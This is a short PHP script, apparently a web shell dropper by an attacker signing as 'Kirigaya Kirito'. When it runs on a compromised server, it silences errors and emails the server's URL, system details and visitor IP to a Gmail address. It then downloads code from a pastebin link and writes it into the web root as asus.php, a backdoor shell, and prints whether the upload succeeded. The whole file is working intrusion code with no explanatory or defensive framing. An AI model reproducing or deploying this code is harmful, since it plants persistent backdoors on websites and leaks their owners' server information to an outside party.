<?php 
error_reporting(0);
echo "Kirigaya Kirito ";
$rans =rand();
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p\nUname : ".php_uname()."\nAcess : http://".$_SERVER['HTTP_HOST']."/asus.php\n*IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]\n";
mail("kirigayakirito790@gmail.com", "SAO !! ".$rans, $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
function parah($url){
    $im = curl_init($url);
    curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($im, CURLOPT_HEADER, 0);
    return curl_exec($im);
    curl_close($im);
}
$web = $_SERVER['HTTP_HOST']."";
$upload = $_SERVER['DOCUMENT_ROOT']. "/asus.php";
$config = parah("https://pastebin.com/raw/14EkAGR4");
$open = fopen($upload, 'w');
fwrite($open, $config);
fclose($open);
if(file_exists($upload)){
    echo "Shell Ke Upload : http://$web/asus.php<br>" ;
}else {
  echo "Gagal Upload Shell -_- <br>";
}
?>